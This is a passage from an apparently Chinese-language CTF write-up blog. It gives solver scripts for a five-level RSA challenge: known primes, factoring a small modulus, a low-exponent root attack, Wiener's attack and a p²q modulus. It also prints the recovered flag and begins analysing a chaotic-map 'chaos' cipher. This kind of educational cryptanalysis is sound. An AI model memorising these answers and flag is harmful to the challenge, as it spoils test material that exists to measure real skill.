</span><br><span class="line"><span class="comment"># Different e may cause danger?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level3</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># So is there anything wrong with RSA as shown below?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level4</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    d = getPrime(<span class="number">64</span>)</span><br><span class="line">    e = inverse(d, (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># What about different n? Just have a try with the hint!</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level5</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * p * q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    d = inverse(e, p * (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    hint = <span class="built_in">pow</span>(d, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;hint = <span class="subst">&#123;hint&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Level 1:&#x27;</span>)</span><br><span class="line">level1(flags[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Level 2:&#x27;</span>)</span><br><span class="line">level2(flags[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Level 3:&#x27;</span>)</span><br><span class="line">level3(flags[<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Level 4:&#x27;</span>)</span><br><span class="line">level4(flags[<span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Level 5:&#x27;</span>)</span><br><span class="line">level5(flags[<span class="number">4</span>])</span><br></pre></td></tr></table></figure><p>可以看到flag被分成5个部分。</p><p>level1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Try to implement your RSA with primes p and q</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level1</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">Level <span class="number">1</span>:</span><br><span class="line">c = <span class="number">22160015525054597533062795679117215923801827397299805735087138192137742945881204146337349060934854888054628153923021387981306839951210090523829296521835965212118849043671673133979884712755090374758002677916820953359774554825569218497687506468472278309097929775388010403607769802840990547048001743970754496905</span></span><br><span class="line">p = <span class="number">6962443023774446497102092246794613339314677593117417573764609329949026862782472380488956732038459060928443992561763464365758383525259954798321350043810351</span></span><br><span class="line">q = <span class="number">9631855759661411029901156175243744760977799976661519182223576693685069000499866459636568713055906075171480855575061732016121299027658733834671035383233163</span></span><br></pre></td></tr></table></figure><p>p,q,e,c都给出来了，直接求，也可以工具一把梭。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flag1</span>():</span><br><span class="line">    c = <span class="number">22160015525054597533062795679117215923801827397299805735087138192137742945881204146337349060934854888054628153923021387981306839951210090523829296521835965212118849043671673133979884712755090374758002677916820953359774554825569218497687506468472278309097929775388010403607769802840990547048001743970754496905</span></span><br><span class="line">    p = <span class="number">6962443023774446497102092246794613339314677593117417573764609329949026862782472380488956732038459060928443992561763464365758383525259954798321350043810351</span></span><br><span class="line">    q = <span class="number">9631855759661411029901156175243744760977799976661519182223576693685069000499866459636568713055906075171480855575061732016121299027658733834671035383233163</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    n = p * q</span><br><span class="line">    d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><p>level2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># But how can we attack the RSA when we didn&#x27;t know the primes?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level2</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">64</span>)</span><br><span class="line">    q = getPrime(<span class="number">64</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">Level <span class="number">2</span>:</span><br><span class="line">c = <span class="number">17250922799297131008803303235771955129</span></span><br><span class="line">n = <span class="number">134097988095851988085603926250918812377</span></span><br></pre></td></tr></table></figure><p>这题给了n，没有p q，工具分解一下。</p><p><img src="https://s2.loli.net/2023/08/04/pbCF6TI8rK9PvdG.png" alt="image-20221005220552164.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flag2</span>():</span><br><span class="line">    c = <span class="number">17250922799297131008803303235771955129</span></span><br><span class="line">    n = <span class="number">134097988095851988085603926250918812377</span></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    p = <span class="number">10094271714305059493</span></span><br><span class="line">    q = <span class="number">13284562957208247589</span></span><br><span class="line">    d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><p>level3：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Different e may cause danger?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level3</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">Level <span class="number">3</span>:</span><br><span class="line">c = <span class="number">2776571135646565181849912433877522437622755332262910824866791711</span></span><br><span class="line">n = <span class="number">85793694792655420934945863688968944466300304898903354212780512650924132933351787673979641944071634528676901506049360194331553838080226562532784448832916022442020751986591703547743056267118831445759258041047213294368605599719242059474324548598203039032847591828382166845797857139844445858881218318006747115157</span></span><br></pre></td></tr></table></figure><p>可以看到e很小，考虑低加密指数攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flag3</span>():</span><br><span class="line">    c = <span class="number">2776571135646565181849912433877522437622755332262910824866791711</span></span><br><span class="line">    n = <span class="number">85793694792655420934945863688968944466300304898903354212780512650924132933351787673979641944071634528676901506049360194331553838080226562532784448832916022442020751986591703547743056267118831445759258041047213294368605599719242059474324548598203039032847591828382166845797857139844445858881218318006747115157</span></span><br><span class="line">    e = <span class="number">3</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mm = c + n * k</span><br><span class="line">        m, flag = gmpy2.iroot(mm, e)</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><p>level4：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># So is there anything wrong with RSA as shown below?</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level4</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    d = getPrime(<span class="number">64</span>)</span><br><span class="line">    e = inverse(d, (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">Level <span class="number">4</span>:</span><br><span class="line">c = <span class="number">68588738085497640698861260094482876262596289469248772328560280530093163764972313090939471997156632421517452790632223565521726590730640805290182026911025142051864898712501214753986865172996090706657535814234291235489829621372021092488300236623525366939477695283380634188510950335639019458758643273802572617191</span></span><br><span class="line">e = <span class="number">51999725233581619348238930320668315462087635295211755849675812266270026439521805156908952855288255992098479180003264827305694330542325533165867427898010879823017054891520626992724274019277478717788189662456052796449734904215067032681345261878977193341769514961038309763898052908572726913209883965288047452751</span></span><br><span class="line">n = <span class="number">68816697240190744603903822351423855593899797203703723038363240057913366227564780805815565183450516726498872118491739132110437976570592602837245705802946829337567674506561850972973663435358068441037127926802688722648016352967768929007662772115485020718202683004813042834036078650571763978066558718285783045969</span></span><br></pre></td></tr></table></figure><p>看到这个e = inverse(d, (p-1) * (q-1))，考虑维纳攻击</p><p><img src="https://s2.loli.net/2023/08/04/es4S3aTG58rANxI.png" alt="image-20221005221502693.png"></p><p>level5：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># What about different n? Just have a try with the hint!</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level5</span>(<span class="params">message</span>):</span><br><span class="line">    m = bytes_to_long(message)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p * p * q</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    d = inverse(e, p * (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">assert</span> m &lt; n</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    hint = <span class="built_in">pow</span>(d, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;hint = <span class="subst">&#123;hint&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">Level <span class="number">5</span>:</span><br><span class="line">c = <span class="number">1135954814335407362237156338232840769700916726653557860319741136149066730262056907097728029957898420630256832277578506404721904131425822963948589774909272408535427656986176833063600681390871582834223748797942203560505159946141171210061405977060061656807175913366911284450695116982731157917343650021723054666494528470413522258995220648163505549701953152705111304471498547618002847587649651689203632845303117282630095814054989963116013144483037051076441508388998829</span></span><br><span class="line">hint = <span class="number">611144874477135520868450203622074557606421849009025270666985817360484127602945558050689975570970227439583312738313767886380304814871432558985582586031211416586296452510050692235459883608453661597776103386009579351911278185434163016083552988251266501525188362673472772346212970459561496301631587043106524741903627979311997541301471894670374945556313285203740782346029579923650160327646876967315182335114575921178144825057359851607166387868294019144940296084605930</span></span><br><span class="line">n = <span class="number">1232865496850144050320992645475166723525103370117149219196294373695624167653495180701004894188767069545579706264513808335877905149818445940067870026924895990672091745229251935876434509430457142930654307044403355838663341948471348893414890261787326255632362887647279204029327042915224570484394917295606592360109952538313570951448278525753313335289675455996833500751672463525151201002407861423542656805624090223118747404488579783372944593022796321473618301206064979</span></span><br></pre></td></tr></table></figure><p>可以看到n很大，尝试用factor分解，没想到分解出来了。有可能是非预期解吧，hint没有用到。</p><p><img src="https://s2.loli.net/2023/08/04/WHezrFTZl64nNAD.png" alt="image-20221005222330514.png"></p><p>直接带入就能出flag。<br>flag{W0w_U_ar3_re4L1y_g0Od_4t_m4th_4nD_RSA!!}</p><h2 id="chaos"><a href="#chaos" class="headerlink" title="chaos"></a>chaos</h2><p>chaos.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LC</span>(<span class="params">key, x, times, flags</span>):</span><br><span class="line">    (k1, k2) = key</span><br><span class="line">    xn = []</span><br><span class="line">    xn.append(x)</span><br><span class="line">    <span class="keyword">if</span> flags:</span><br><span class="line">        xn.append(<span class="number">1</span> - <span class="number">2</span> * xn[<span class="number">0</span>]**<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        xn.append(k2 * xn[<span class="number">0</span>]**<span class="number">3</span> + (<span class="number">1</span> - k2)*xn[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        <span class="keyword">assert</span> xn[i]&gt;=-<span class="number">1</span> <span class="keyword">and</span> xn[i]&lt;=<span class="number">1</span> <span class="keyword">and</span> xn[i+<span class="number">1</span>]&gt;=-<span class="number">1</span> <span class="keyword">and</span> xn[i+<span class="number">1</span>]&lt;=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> flags:</span><br><span class="line">            xn.append((<span class="number">1</span> - <span class="number">2</span> * xn[i]**<span class="number">2</span>)*(k1 * xn[i+<span class="number">1</span>]**<span class="number">3</span> + (<span class="number">1</span> - k1)*xn[i+<span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            xn.append((k2 * xn[i]**<span class="number">3</span> + (<span class="number">1</span> - k2)*xn[i])*(<span class="number">1</span> - <span class="number">2</span> * xn[i+<span class="number">1</span>]**<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> xn[times + <span class="number">1</span>]</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="built_in">sum</span>, r, k = <span class="number">0</span>, <span class="number">1</span>, []</span><br><span class="line">    k1 = random.uniform(<span class="number">3.2</span>, <span class="number">4</span>)</span><br><span class="line">    k2 = random.uniform(<span class="number">3.2</span>, <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        k.append(random.randint(<span class="number">1</span>,<span class="number">256</span>))</span><br><span class="line">        <span class="built_in">sum</span> += k[-<span class="number">1</span>]</span><br><span class="line">        r ^= k[-<span class="number">1</span>]  </span><br><span class="line">    a_1 = (<span class="built_in">sum</span>/<span class="number">256</span>) % <span class="number">1</span></span><br><span class="line">    timea1 = <span class="number">3</span> + <span class="built_in">int</span>(<span class="number">1000</span> * a_1) % <span class="number">30</span></span><br><span class="line">    b_1 = (r/<span class="number">256</span>)</span><br><span class="line">    timeb1 = <span class="number">3</span> + <span class="built_in">int</span>(<span class="number">1000</span> * b_1) % <span class="number">30</span></span><br><span class="line">    xc_1 = a_1 * b_1</span><br><span class="line">    yc_1 = (a_1 + b_1) % <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;k1, k2 = %r, %r&#x27;</span>%(k1, k2))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;k = %r&#x27;</span>%k)</span><br><span class="line">    <span class="keyword">return</span> (k1, k2), (a_1, timea1, b_1, timeb1, xc_1, yc_1)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">key, data, flag</span>):</span><br><span class="line">    (k1, k2) = key</span><br><span class="line">    (a_1, timea1, b_1, timeb1, xc_1, yc_1) = data</span><br><span class="line">    flag = <span class="built_in">list</span>(flag)</span><br><span class="line">    m, c = [], []</span><br><span class="line">    miu, omiga = [], []</span><br><span class="line">    ta = timea1</span><br><span class="line">    tb = timeb1</span><br><span class="line">    <span class="keyword">for</span> tmp <span class="keyword">in</span> flag:</span><br><span class="line">        mi = <span class="built_in">ord</span>(tmp)</span><br><span class="line">        miu.append(LC(key, a_1, ta, <span class="number">1</span>))</span><br><span class="line">        omiga.append(LC(key, b_1, tb, <span class="number">0</span>))</span><br><span class="line">        c.append(((<span class="built_in">int</span>(miu[-<span class="number">1</span>] * <span class="number">1000</span>) + <span class="built_in">int</span>(omiga[-<span class="number">1</span>] * <span class="number">1000</span>)) ^ mi) % <span class="number">256</span>)</span><br><span class="line">        delta = c[-<span class="number">1</span>]/<span class="number">256</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            y = (yc_1 + delta) % <span class="number">1</span></span><br><span class="line">            y = k1 * y**<span class="number">3</span> + (<span class="number">1</span> - k1) * y</span><br><span class="line">            x = xc_1</span><br><span class="line">            x = k2 * x**<span class="number">3</span> + (<span class="number">1</span> - k2) * x</span><br><span class="line">        ta = <span class="number">3</span> + <span class="built_in">int</span>(<span class="number">1000</span> * x) % <span class="number">30</span></span><br><span class="line">        tb = <span class="number">3</span> + <span class="built_in">int</span>(<span class="number">1000</span> * y) % <span class="number">30</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c = %r&#x27;</span>%(c))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># print(flag)</span></span><br><span class="line">    key, data = init()</span><br><span class="line">    c = encrypt(key, data, flag)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">k1, k2 = 3.967139695598587, 3.7926025078694305                                          </span></span><br><span class="line"><span class="string">k = [107, 99, 55, 198, 210, 56, 137, 44, 127, 25, 150, 113, 75, 215, 187, 132]          </span></span><br><span class="line"><span class="string">c = [23, 84, 105, 111, 230, 105, 97, 50, 58, 61, 25, 97, 57, 21, 175, 77, 102, 138, 120, 17, 66, 172, 52, 178, 101, 221, 109, 126, 71, 149, 63, 32, 56, 6, 134, 255, 110, 57, 15, 20, 116]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>已知条件：k1,k2,c</p><p><img src="https://s2.loli.net/2023/08/04/HwWngq7hCt1cR8I.png" alt="image-20221005222703786.png"></p><p>Step 1:</p><p>先看最底下先运行的部分,key,data = init()，跟进</p><p><img src="https://s2.loli.net/2023/08/04/ST4DIkqRQzMivBL.png" alt="image-20221005222737943.png"></p><p>首先，k1,k2是3.2到4区间的随机小数，题目print出来了，也就是key。 这是题目给我们的已知条件key</p><p>其次，sum,r,k给了我们，其中k也被print出来，我们看看k是什么东西。</p><p><img src="https://s2.loli.net/2023/08/04/qOir3mDT6WfCFaz.png" alt="image-20221005222838187.png"><br>k经过了16次循环，每次添加1-256之间的随机数，与此同时 sum和r也与k有关，那么题目告诉了我们k还有sum和r的原值，我们可以推出sum和r</p><p>sum和r又有什么用呢？</p><p><img src="https://s2.loli.net/2023/08/04/f7ASnbaVZqcr5NM.png" alt="image-20221005222911437.png"><br>这些数据都与sum和r有关，只要我们知道了sum和r，就可以知道这些数据，也就是return回去的data</p><p>所以我们已知条件已有：sum，r，k</p><p>可以推出 =&gt; a_1, timea1, b_1, timeb1, xc_1, yc_1 =&gt; data</p><p>已知：k1，k2 可以推出=&gt; key</p><p>先写脚本把data推出，遍历k，然后得出sum和r 最后把每个值得出即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sum</span>, r, k = <span class="number">0</span>, <span class="number">1</span>, [<span class="number">107</span>, <span class="number">99</span>, <span class="number">55</span>, <span class="number">198</span>, <span class="number">210</span>, <span class="number">56</span>, <span class="number">137</span>, <span class="number">44</span>, <span class="number">127</span>, <span class="number">25</span>, <span class="number">150</span>, <span class="number">113</span>, <span class="number">75</span>, <span class="number">215</span>, <span class="number">187</span>, <span class="number">132</span>]  </span><br><span class="line">k1,k2 = <span class="number">3.967139695598587</span>, <span class="number">3.7926025078694305</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">    <span class="built_in">sum</span> += i</span><br><span class="line">    r ^= i</span><br><span class="line">a_1 = (<span class="built_in">sum</span>/<span class="number">256</span>) % <span class="number">1</span></span><br><span class="line">timea1 = <span class="number">3</span> + <span class="built_in">int</span>(<span class="number">1000</span> * a_1) % <span class="number">30</span></span><br><span class="line">b_1 = (r/<span class="number">256</span>)</span><br><span class="line">timeb1 = <span class="number">3</span> + <span class="built_in">int</span>(<span class="number">1000</span> * b_1) % <span class="number">30</span></span><br><span class="line">xc_1 = a_1 * b_1</span><br><span class="line">yc_1 = (a_1 + b_1) % <span class="number">1</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">data = (a_1, timea1, b_1, timeb1, xc_1, yc_1)</span><br><span 